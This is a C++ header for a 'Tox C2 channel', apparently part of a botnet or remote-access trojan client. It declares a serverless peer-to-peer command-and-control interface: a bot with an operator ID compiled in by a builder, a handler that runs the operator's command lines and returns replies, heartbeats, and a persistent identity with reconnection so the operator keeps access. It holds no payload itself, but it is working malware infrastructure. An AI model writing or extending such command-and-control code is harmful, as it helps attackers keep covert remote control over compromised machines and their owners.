#pragma once

#include <cstdint>
#include <functional>
#include <string>
#include <vector>

/*
 * Tox C2 channel.
 *
 * A peer-to-peer, serverless command channel built on c-toxcore. The bot owns
 * a single Tox instance on its own thread and communicates with one operator
 * (the operator's Tox ID is compiled in by the builder).
 *
 * Robustness properties:
 *   - Persistent identity: the Tox state is saved/loaded to disk, so the bot's
 *     Tox ID survives restarts and the operator can keep it as a friend.
 *   - Multi-node bootstrap + re-bootstrap watchdog: if the DHT connection
 *     drops for too long, all bootstrap nodes are contacted again.
 *   - Sender authentication: only messages whose sender public key matches the
 *     operator's public key are dispatched. Friend requests from anyone else
 *     are ignored.
 *   - Thread confinement: every Tox API call happens on the Tox thread. Other
 *     threads only interact through the thread-safe entry points below.
 *
 * The library is linked in by CMake (ENABLE_TOX_C2). This header does not
 * include <tox/tox.h>; the implementation is the only place that does.
 */
namespace ToxC2 {

struct Config {
    std::string operatorId;   // 76-char hex Tox ID of the operator
    std::string operatorPkHex; // optional: 64-char operator public key (overrides operatorId's key)
    std::string embeddedSavedataHex; // optional: hex bot savedata for a fixed identity
    std::string savedataPath; // path used to persist the Tox identity (may be empty)
    std::string name;         // bot nickname shown to the operator
    std::string helloMessage; // optional: payload sent with the friend request (e.g. "hello <hash>")
};

// Invoked on the Tox thread when the operator sends a command line.
// Must be quick and thread-safe. Return the reply to send back (empty = none).
using CommandHandler = std::function<std::string(const std::string& commandLine)>;

// Spawns the Tox thread. Returns false if it cannot start (e.g. invalid ID).
bool Start(const Config& cfg, CommandHandler handler);

// Stops the thread, persists the identity and releases the instance.
// Safe to call multiple times.
void Stop();

bool IsRunning();
bool IsConnected();

// Returns the bot's own Tox ID (76 hex chars). Empty until the Tox thread has
// created the instance. Thread-safe.
std::string GetSelfAddress();

// Queue a message to the operator (thread-safe). Used for hello/heartbeat.
bool SendToOperator(const std::string& message);

// hex <-> bytes helpers shared with the rest of the client.
std::vector<uint8_t> HexToBytes(const std::string& hex);
std::string BytesToHex(const uint8_t* data, size_t len);

} // namespace ToxC2
